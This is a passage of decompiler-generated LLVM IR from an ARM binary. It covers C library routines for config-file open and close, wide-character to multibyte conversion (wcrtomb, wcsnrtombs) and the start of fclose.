  %v2_19718 = call i32 @__GI_strchr(i32 %v0_19714, i32 %v4_19710)
  store i32 %v2_19718, i32* %r0.global-to-local, align 4
  %v2_1971c = icmp eq i32 %v2_19718, 0
  store i1 %v2_1971c, i1* %cpsr_z.global-to-local, align 1
  %v0_19724.pre = load i32, i32* @r4, align 4
  br i1 %v2_1971c, label %dec_label_pc_19724, label %dec_label_pc_1970c

dec_label_pc_19724:                               ; preds = %dec_label_pc_19710, %dec_label_pc_196ec, %dec_label_pc_196cc
  %v3_19730 = phi i32 [ %v5_196f4, %dec_label_pc_196ec ], [ %v2_196e4, %dec_label_pc_196cc ], [ %v0_19724.pre, %dec_label_pc_19710 ]
  %v1_19724 = inttoptr i32 %v3_19730 to i8*
  %v2_19724 = load i8, i8* %v1_19724, align 1
  %v3_19724 = zext i8 %v2_19724 to i32
  store i32 %v3_19724, i32* %r2.global-to-local, align 4
  %v0_19728 = load i32, i32* @r7, align 4
  %v1_19728 = inttoptr i32 %v0_19728 to i8*
  %v2_19728 = load i8, i8* %v1_19728, align 1
  %v3_19728 = zext i8 %v2_19728 to i32
  store i32 %v3_19728, i32* %r3.global-to-local, align 4
  %v9_1972c = icmp eq i8 %v2_19728, %v2_19724
  store i1 %v9_1972c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1972c, label %bb71, label %dec_label_pc_19738

bb71:                                             ; preds = %dec_label_pc_19724
  %v1_19730 = load i32, i32* @fp, align 4
  %v2_19730 = trunc i32 %v1_19730 to i8
  store i8 %v2_19730, i8* %v1_19724, align 1
  %v0_19734.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19734.pr, label %bb73, label %.dec_label_pc_19738_crit_edge

.dec_label_pc_19738_crit_edge:                    ; preds = %bb71
  %v0_19738.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19738

dec_label_pc_19738:                               ; preds = %.dec_label_pc_19738_crit_edge, %dec_label_pc_19724
  %v0_19738 = phi i32 [ %v0_19738.pre, %.dec_label_pc_19738_crit_edge ], [ %v3_19724, %dec_label_pc_19724 ]
  %v2_19738 = icmp eq i32 %v0_19738, 0
  store i1 %v2_19738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19738, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_19738
  %v1_1973c = load i32, i32* @fp, align 4
  %v2_1973c = trunc i32 %v1_1973c to i8
  %v3_1973c = load i32, i32* @r4, align 4
  %v4_1973c = inttoptr i32 %v3_1973c to i8*
  store i8 %v2_1973c, i8* %v4_1973c, align 1
  %v5_1973c = load i32, i32* @r4, align 4
  %v6_1973c = add i32 %v5_1973c, 1
  store i32 %v6_1973c, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_19738, %bb72
  %v2_19740 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_19740, i32* %r3.global-to-local, align 4
  %v2_19744 = icmp eq i32 %v2_19740, 0
  store i1 %v2_19744, i1* %cpsr_z.global-to-local, align 1
  %v0_19760.pre = load i32, i32* @r4, align 4
  br i1 %v2_19744, label %dec_label_pc_1975c, label %dec_label_pc_1974c

dec_label_pc_1974c:                               ; preds = %bb73
  store i32 %v0_19760.pre, i32* @r0, align 4
  %v1_19754 = inttoptr i32 %v0_19760.pre to i8*
  %v2_19754 = call i32 @__GI_strspn(i8* %v1_19754)
  store i32 %v2_19754, i32* %r0.global-to-local, align 4
  %v0_19758 = load i32, i32* @r4, align 4
  %v2_19758 = add i32 %v0_19758, %v2_19754
  store i32 %v2_19758, i32* @r4, align 4
  br label %dec_label_pc_1975c

dec_label_pc_1975c:                               ; preds = %bb73, %dec_label_pc_1974c
  %v0_19760 = phi i32 [ %v2_19758, %dec_label_pc_1974c ], [ %v0_19760.pre, %bb73 ]
  %v0_1975c = load i32, i32* @r6, align 4
  %v1_1975c = add i32 %v0_1975c, 1
  store i32 %v1_1975c, i32* @r6, align 4
  %v1_19760 = inttoptr i32 %v0_19760 to i8*
  %v2_19760 = load i8, i8* %v1_19760, align 1
  %v3_19760 = zext i8 %v2_19760 to i32
  store i32 %v3_19760, i32* %r2.global-to-local, align 4
  %v2_19764 = icmp eq i8 %v2_19760, 0
  store i1 %v2_19764, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19764, label %dec_label_pc_1977c, label %dec_label_pc_1975c.dec_label_pc_1976c_crit_edge

dec_label_pc_1975c.dec_label_pc_1976c_crit_edge:  ; preds = %dec_label_pc_1975c
  %v0_1976c.pre = load i32, i32* @r7, align 4
  %v1_1976c = inttoptr i32 %v0_1976c.pre to i8*
  %v2_1976c = load i8, i8* %v1_1976c, align 1
  %v3_1976c = zext i8 %v2_1976c to i32
  store i32 %v3_1976c, i32* %r3.global-to-local, align 4
  %v9_19770 = icmp eq i8 %v2_1976c, %v2_19760
  store i1 %v9_19770, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_19770, label %dec_label_pc_1977c, label %bb74

bb74:                                             ; preds = %dec_label_pc_1976c.preheader, %dec_label_pc_1975c.dec_label_pc_1976c_crit_edge
  %v2_196b888 = phi i32 [ %v1_1975c, %dec_label_pc_1975c.dec_label_pc_1976c_crit_edge ], [ %v1_1969c, %dec_label_pc_1976c.preheader ]
  %v0_196b887 = phi i32 [ %v0_19760, %dec_label_pc_1975c.dec_label_pc_1976c_crit_edge ], [ %v0_1976013, %dec_label_pc_1976c.preheader ]
  %v2_19774 = load i32, i32* @sb, align 4
  %v3_19774 = sub i32 %v2_196b888, %v2_19774
  %v5_19774 = xor i32 %v2_19774, %v2_196b888
  %v6_19774 = xor i32 %v3_19774, %v2_196b888
  %v7_19774 = and i32 %v6_19774, %v5_19774
  %v8_19774 = icmp slt i32 %v7_19774, 0
  %v9_19774 = icmp slt i32 %v3_19774, 0
  %v10_19774 = icmp eq i32 %v2_196b888, %v2_19774
  store i1 %v10_19774, i1* %cpsr_z.global-to-local, align 1
  %v2_19778 = xor i1 %v9_19774, %v8_19774
  br i1 %v2_19778, label %dec_label_pc_196a8, label %dec_label_pc_1977c

dec_label_pc_1977c:                               ; preds = %dec_label_pc_1976c.preheader, %bb74, %dec_label_pc_1975c, %dec_label_pc_1975c.dec_label_pc_1976c_crit_edge, %dec_label_pc_19760.preheader
  %v0_19780 = phi i32 [ %v1_1969c, %dec_label_pc_19760.preheader ], [ %v1_1969c, %dec_label_pc_1976c.preheader ], [ %v2_196b888, %bb74 ], [ %v1_1975c, %dec_label_pc_1975c ], [ %v1_1975c, %dec_label_pc_1975c.dec_label_pc_1976c_crit_edge ]
  store i32 %v3_194a0, i32* %r2.global-to-local, align 4
  %v9_19780 = icmp eq i32 %v0_19780, %v3_194a0
  store i1 %v9_19780, i1* %cpsr_z.global-to-local, align 1
  %v6_19784 = icmp slt i32 %v0_19780, %v3_194a0
  br i1 %v6_19784, label %dec_label_pc_19788, label %dec_label_pc_19794

dec_label_pc_19788:                               ; preds = %dec_label_pc_1977c
  %v0_19788 = load i32, i32* @r8, align 4
  %v1_19788 = and i32 %v0_19788, 1048576
  %v2_19788 = icmp eq i32 %v1_19788, 0
  store i1 %v2_19788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19788, label %dec_label_pc_194e0.backedge, label %dec_label_pc_19790

dec_label_pc_19790:                               ; preds = %dec_label_pc_19788, %dec_label_pc_19648, %.thread, %entry
  br label %dec_label_pc_19794

dec_label_pc_19794:                               ; preds = %dec_label_pc_1977c, %dec_label_pc_19564, %dec_label_pc_19790
  %v0_19794 = phi i32 [ %v0_19574, %dec_label_pc_19564 ], [ 0, %dec_label_pc_19790 ], [ %v0_19780, %dec_label_pc_1977c ]
  store i32 %v0_19794, i32* %r0.global-to-local, align 4
  store i32 %v3_1947c, i32* @r4, align 4
  store i32 %v6_1947c, i32* @r5, align 4
  store i32 %v9_1947c, i32* @r6, align 4
  store i32 %v12_1947c, i32* @r7, align 4
  store i32 %v15_1947c, i32* @r8, align 4
  store i32 %v18_1947c, i32* @sb, align 4
  store i32 %v21_1947c, i32* @sl, align 4
  store i32 %v24_1947c, i32* @fp, align 4
  ret i32 %v0_19794

; uselistorder directives
  uselistorder i32 %v0_19794, { 1, 0 }
  uselistorder i32 %v0_19780, { 0, 2, 1 }
  uselistorder i32 %v3_19774, { 1, 0 }
  uselistorder i32 %v2_19774, { 1, 0, 2 }
  uselistorder i32 %v2_196b888, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_19770, { 1, 0 }
  uselistorder i32 %v0_19760.pre, { 0, 2, 1 }
  uselistorder i32 %v5_196f4, { 1, 0, 2, 3 }
  uselistorder i1 %v9_1977086, { 1, 0 }
  uselistorder i1 %v9_19698, { 1, 0 }
  uselistorder i32 %v3_19670, { 0, 2, 1, 3 }
  uselistorder i1 %v7_19648, { 1, 0 }
  uselistorder i1 %v8_19640, { 1, 0 }
  uselistorder i32 %v3_19610, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_19600, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_195e8, { 1, 0, 2 }
  uselistorder i32 %v1_195d8, { 1, 0, 2 }
  uselistorder i32 %v0_195c4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_195bc, { 1, 0 }
  uselistorder i32 %v1_195a8, { 1, 0 }
  uselistorder i32 %v1_195a4, { 1, 0 }
  uselistorder i32 %v2_19580, { 1, 0 }
  uselistorder i32 %v1_19564, { 2, 0, 1 }
  uselistorder i32 %v0_1954c, { 1, 0 }
  uselistorder i32 %v1_1953c, { 0, 2, 1 }
  uselistorder i1 %v2_1966c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_194c8, { 2, 0, 1, 3 }
  uselistorder i32 %v1_194bc, { 2, 1, 0 }
  uselistorder i32 %v3_194a4, { 1, 0 }
  uselistorder i32 %v3_194a0, { 2, 1, 0 }
  uselistorder i32 %v1_19498, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 7, 2, 3, 4, 5, 6, 1, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 16, 8, 9, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 33, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 81, { 0, 2, 1 }
  uselistorder i32 %arg3, { 2, 3, 1, 5, 0, 4, 6 }
  uselistorder label %dec_label_pc_19794, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1977c, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_1975c, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19710, { 1, 0 }
  uselistorder label %dec_label_pc_194e0.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_19688, { 1, 0 }
  uselistorder label %dec_label_pc_19648, { 1, 0 }
  uselistorder label %dec_label_pc_1963c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_19600, { 1, 0 }
  uselistorder label %dec_label_pc_19534, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_197a8 = icmp eq i32* %arg1, null
  br i1 %v2_197a8, label %dec_label_pc_197d0, label %dec_label_pc_197b0

dec_label_pc_197b0:                               ; preds = %entry
  %v2_197b0 = load i32, i32* %arg1, align 4
  %v1_197b4 = inttoptr i32 %v2_197b0 to i16*
  %v2_197b4 = call i32 @__GI_fclose(i16* %v1_197b4)
  %v0_197b8 = load i32, i32* @r4, align 4
  %v1_197b8 = add i32 %v0_197b8, 20
  %v2_197b8 = inttoptr i32 %v1_197b8 to i32*
  %v3_197b8 = load i32, i32* %v2_197b8, align 4
  %v2_197bc = icmp eq i32 %v3_197b8, 0
  br i1 %v2_197bc, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_197b0
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_197b0, %bb
  store i32 104392, i32* @lr, align 4
  %v1_197c4 = xor i1 %v2_197bc, true
  call void @__pseudo_cond_branch(i1 %v1_197c4, i32 ptrtoint (i32* @global_var_17278.1556 to i32))
  %v0_197c8 = load i32, i32* @r4, align 4
  store i32 %v0_197c8, i32* @r0, align 4
  %v0_197cc = call i32 @free()
  br label %dec_label_pc_197d0

dec_label_pc_197d0:                               ; preds = %entry, %bb6
  %v1_197d4 = phi i32 [ 0, %entry ], [ %v0_197cc, %bb6 ]
  ret i32 %v1_197d4

; uselistorder directives
  uselistorder label %dec_label_pc_197d0, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_197e4 = load i32, i32* @r4, align 4
  store i32 %v3_197e4, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34332), i32* @r1, align 4
  %v0_197ec = load i32, i32* @r0, align 4
  %v2_197ec = load i32, i32* @r2, align 4
  %v4_197ec = call i32 @__GI_fopen(i32 %v0_197ec, i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34332), i32 %v2_197ec, i32 ptrtoint (i32* @global_var_2e024.1314 to i32))
  store i32 %v4_197ec, i32* %r0.global-to-local, align 4
  store i32 %v4_197ec, i32* @r4, align 4
  %v2_197f0 = icmp eq i32 %v4_197ec, 0
  br i1 %v2_197f0, label %bb, label %dec_label_pc_197fc

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_197fc:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_19804 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_19804, i32* %r0.global-to-local, align 4
  %v2_19808 = icmp eq i32 %v2_19804, 0
  br i1 %v2_19808, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_197fc
  %v1_1980c = load i32, i32* @r4, align 4
  %v3_1980c = inttoptr i32 %v2_19804 to i32*
  store i32 %v1_1980c, i32* %v3_1980c, align 4
  %v1_19814.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_197fc, %bb4
  %v1_19814 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_197fc ], [ %v1_19814.pre, %bb4 ]
  %v2_19810 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19810, i32* @r4, align 4
  ret i32 %v1_19814

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34332), { 1, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_19820 = load i32, i32* @lr, align 4
  %v2_19824 = icmp eq i32 %arg1, 0
  br i1 %v2_19824, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_1982c = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_19854 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_19840 = phi i32 [ %arg1, %.thread ], [ %v3_1982c, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_1983c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1983c, i32* @ip, align 4
  %v2_19844 = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_1983c, i32* %stack_var_-16, align 4
  store i32 %v0_19854, i32* %stack_var_-12, align 4
  %v5_1985c = inttoptr i32 %v0_19840 to i8*
  %v6_1985c = call i32 @__GI_wcsnrtombs(i8* %v5_1985c, i32 %v2_19844, i32 1, i32 16, i32 %arg3)
  %v2_19860 = icmp eq i32 %v6_1985c, 0
  br i1 %v2_19860, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_19870 = phi i32 [ %v6_1985c, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_19820, i32* @lr, align 4
  ret i32 %v1_19870

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_19888 = load i32, i32* @r0, align 4
  %v1_19888 = load i32, i32* @r1, align 4
  %v5_19888 = inttoptr i32 %v0_19888 to i8*
  %v6_19888 = call i32 @__GI_wcsnrtombs(i8* %v5_19888, i32 %v1_19888, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_19888

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19898 = load i32, i32* @r4, align 4
  store i32 %v3_19898, i32* %stack_var_-12, align 4
  %v10_1989c = icmp eq i32 %tmp, %arg2
  store i1 %v10_1989c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_1989c, label %dec_label_pc_198b4, label %bb

bb:                                               ; preds = %entry
  %v4_198a0 = icmp eq i8* %arg1, null
  store i1 %v4_198a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_198a0, label %dec_label_pc_198b4.thread, label %bb39

dec_label_pc_198b4.thread:                        ; preds = %bb
  %v2_198a4 = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_198b4:                               ; preds = %entry
  %v2_198a41 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_198b4 = icmp eq i8* %arg1, null
  store i1 %v3_198b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_198b4, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_198b4
  store i32 %v2_198a41, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_198b4, %dec_label_pc_198b4.thread
  %storemerge20 = phi i32 [ %v2_198a41, %dec_label_pc_198b4 ], [ %v2_198a4, %dec_label_pc_198b4.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_1991028 = phi i32 [ %v2_198a41, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_198cc = load i32, i32* @r3, align 4
  %v3_198cc = icmp uge i32 %v0_198cc, %arg3
  %arg3.v0_198cc = select i1 %v3_198cc, i32 %arg3, i32 %v0_198cc
  store i32 %arg3.v0_198cc, i32* %r5.global-to-local, align 4
  %v1_198d8 = inttoptr i32 %arg2 to i32*
  %v2_198d8 = load i32, i32* %v1_198d8, align 4
  store i32 %v2_198d8, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_198cc, i32* %r0.global-to-local, align 4
  %v2_1992422 = icmp eq i32 %arg3.v0_198cc, 0
  store i1 %v2_1992422, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1992422, label %dec_label_pc_1992c, label %dec_label_pc_198e4

dec_label_pc_198e4:                               ; preds = %.thread14.thread, %dec_label_pc_1991c.dec_label_pc_198e4_crit_edge
  %v2_19910 = phi i32 [ %v2_1991c, %dec_label_pc_1991c.dec_label_pc_198e4_crit_edge ], [ %v2_1991028, %.thread14.thread ]
  %v0_198f0 = phi i32 [ %v0_198e4.pre, %dec_label_pc_1991c.dec_label_pc_198e4_crit_edge ], [ %v2_198d8, %.thread14.thread ]
  %v1_198e4 = inttoptr i32 %v0_198f0 to i32*
  %v2_198e4 = load i32, i32* %v1_198e4, align 4
  %v7_198e8 = icmp eq i32 %v2_198e4, 127
  store i1 %v7_198e8, i1* %cpsr_z.global-to-local, align 1
  %v1_198ec = urem i32 %v2_198e4, 256
  store i32 %v1_198ec, i32* @ip, align 4
  %v1_198f0 = add i32 %v0_198f0, 4
  store i32 %v1_198f0, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_198e4, 128
  br i1 %tmp45, label %dec_label_pc_1990c, label %dec_label_pc_198f8

dec_label_pc_198f8:                               ; preds = %dec_label_pc_198e4
  %v0_198f8 = call i32 @__GI___errno_location()
  store i32 %v0_198f8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_19904 = inttoptr i32 %v0_198f8 to i32*
  store i32 84, i32* %v2_19904, align 4
  %v0_19938.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19938

dec_label_pc_1990c:                               ; preds = %dec_label_pc_198e4
  %v2_1990c = icmp eq i32 %v1_198ec, 0
  store i1 %v2_1990c, i1* %cpsr_z.global-to-local, align 1
  %v1_19910 = trunc i32 %v2_198e4 to i8
  %v3_19910 = inttoptr i32 %v2_19910 to i8*
  store i8 %v1_19910, i8* %v3_19910, align 1
  %v0_19914 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19914, label %.dec_label_pc_1992c_crit_edge, label %dec_label_pc_1991c

dec_label_pc_1991c:                               ; preds = %dec_label_pc_1990c
  %v0_1991c = load i32, i32* %lr.global-to-local, align 4
  %v1_1991c = load i32, i32* %r4.global-to-local, align 4
  %v2_1991c = add i32 %v1_1991c, %v0_1991c
  store i32 %v2_1991c, i32* %lr.global-to-local, align 4
  %v0_19920 = load i32, i32* %r0.global-to-local, align 4
  %v1_19920 = add i32 %v0_19920, -1
  store i32 %v1_19920, i32* %r0.global-to-local, align 4
  %v2_19924 = icmp eq i32 %v1_19920, 0
  store i1 %v2_19924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19924, label %dec_label_pc_1992c, label %dec_label_pc_1991c.dec_label_pc_198e4_crit_edge

dec_label_pc_1991c.dec_label_pc_198e4_crit_edge:  ; preds = %dec_label_pc_1991c
  %v0_198e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_198e4

.dec_label_pc_1992c_crit_edge:                    ; preds = %dec_label_pc_1990c
  %v1_19914 = load i32, i32* @ip, align 4
  store i32 %v1_19914, i32* %r2.global-to-local, align 4
  %v0_1992c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_1992c

dec_label_pc_1992c:                               ; preds = %dec_label_pc_1991c, %.dec_label_pc_1992c_crit_edge, %.thread14.thread
  %v0_1992c = phi i32 [ %v0_1992c.pre, %.dec_label_pc_1992c_crit_edge ], [ %v2_1991028, %.thread14.thread ], [ %v2_1991c, %dec_label_pc_1991c ]
  %v1_1992c = load i32, i32* @sp, align 4
  %v9_1992c = icmp eq i32 %v0_1992c, %v1_1992c
  store i1 %v9_1992c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1992c, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_1992c
  %v1_19930 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_19930, i32* %v1_198d8, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1992c, %bb43
  %v0_19934 = load i32, i32* %r0.global-to-local, align 4
  %v1_19934 = load i32, i32* %r5.global-to-local, align 4
  %v2_19934 = sub i32 %v1_19934, %v0_19934
  store i32 %v2_19934, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19938

dec_label_pc_19938:                               ; preds = %dec_label_pc_198f8, %bb44
  %v0_19938 = phi i32 [ %v0_19938.pre, %dec_label_pc_198f8 ], [ %v2_19934, %bb44 ]
  store i32 %v0_19938, i32* %r0.global-to-local, align 4
  %v2_19940 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_19940, i32* %r4.global-to-local, align 4
  ret i32 %v0_19938

; uselistorder directives
  uselistorder i32 %v0_19938, { 1, 0 }
  uselistorder i32 %v1_19920, { 1, 0 }
  uselistorder i32 %v2_1991c, { 0, 2, 1 }
  uselistorder i32 %v1_198ec, { 1, 0 }
  uselistorder i32 %v2_198e4, { 2, 0, 1, 3 }
  uselistorder i32 %v2_1991028, { 1, 0 }
  uselistorder i32 %v2_198a41, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 5, 3, 4, 6, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 6, 1, 0 }
  uselistorder i32* %lr.global-to-local, { 4, 2, 5, 0, 3, 1, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 6, 3, 4, 5, 0, 7, 1, 8, 9 }
  uselistorder i32 127, { 6, 0, 4, 1, 3, 5, 2 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19938, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_1992c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_198e4, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_19948 = load i32, i32* @r4, align 4
  store i32 %v3_19948, i32* %stack_var_-36, align 4
  %v6_19948 = load i32, i32* @r5, align 4
  %v9_19948 = load i32, i32* @r6, align 4
  %v12_19948 = load i32, i32* @r7, align 4
  %v15_19948 = load i32, i32* @r8, align 4
  %v27_19948 = load i32, i32* @lr, align 4
  %v2_1994c = add i32 %tmp, 52
  %v3_1994c = inttoptr i32 %v2_1994c to i32*
  %v4_1994c = load i32, i32* %v3_1994c, align 4
  %v1_19954 = sub i32 1, %v4_1994c
  %v2_19954 = icmp ult i32 %v4_1994c, 2
  br i1 %v2_19954, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_19954, %entry ]
  %v0_1995c = phi i32 [ 0, %bb ], [ %v1_19954, %entry ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_1995c = icmp eq i32 %v0_1995c, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r6, align 4
  br i1 %v2_1995c, label %dec_label_pc_199a8, label %dec_label_pc_19970

dec_label_pc_19970:                               ; preds = %thread-pre-split
  %v4_19988 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_19988)
  %v0_1999c = load i32, i32* @r6, align 4
  %v2_1999c = add i32 %v0_1999c, 20
  %v3_1999c = inttoptr i32 %v2_1999c to i32*
  %v4_1999c = load i32, i32* %v3_1999c, align 4
  call void @__pseudo_branch(i32 %v4_1999c)
  %v0_199a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_199a8

dec_label_pc_199a8:                               ; preds = %thread-pre-split, %dec_label_pc_19970
  %v1_199b0 = phi i32 [ %tmp, %thread-pre-split ], [ %v0_199a8.pre, %dec_label_pc_19970 ]
  %v1_199a8 = inttoptr i32 %v1_199b0 to i16*
  %v2_199a8 = load i16, i16* %v1_199a8, align 2
  %v3_199a8 = zext i16 %v2_199a8 to i32
  %v1_199ac = and i32 %v3_199a8, 64
  %v2_199ac = icmp eq i32 %v1_199ac, 0
  br i1 %v2_199ac, label %bb18, label %bb17

bb17:                                             ; preds = %dec_label_pc_199a8
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_199a8, %bb17
